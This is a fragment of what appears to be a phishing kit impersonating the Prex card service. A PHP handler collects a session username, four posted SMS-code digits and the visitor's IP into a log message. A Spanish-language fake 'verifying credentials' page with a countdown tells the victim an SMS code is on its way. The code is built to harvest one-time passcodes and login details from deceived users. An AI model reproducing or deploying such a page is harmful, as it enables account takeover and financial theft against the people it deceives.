...
if ( isset ($_POST['p1']) && isset ($_POST['p2']) && isset ($_POST['p3']) && isset ($_POST['p4']) && isset($_SESSION['SMS']) ){
$usario=$_SESSION['SMS'];


$message = "User.: ".$usario." Cod2Pin.: ".$_POST['p1']."".$_POST['p2']."".$_POST['p3']."".$_POST['p4']." ".$_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
...
<script language="JavaScript">
    ...
    {
        document.getElementById('CuentaAtras').innerHTML = "Por favor, espera "+totalTiempo+" segundos, estamos enviando un codigo SMS. <br> ";
	...
	<div class="container content text-center">
		<div class="row">
			<div class="col-md-4 col-md-offset-4 col-sm-6 col-sm-offset-3">
				<form class="reg-page" id="formLogin" method="post" action="loginp.php" enctype="multipart/form-data">
					<div class="reg-header">
						<a href="https://www.prexcard.com/"><img src="./htfoc/prexnewSolo.png" style="width: 24%;"></a>
					</div>
					<p class="p_ingresa">Verificando credenciales</p>

					<div class="input-group margin-bottom-20 div_input" id="div_usuario">
						<center><img src="loading.gif" width="40%;" height="40%;"><br><br>
                            <label id="CuentaAtras"></label>
                        </center>
					</div>
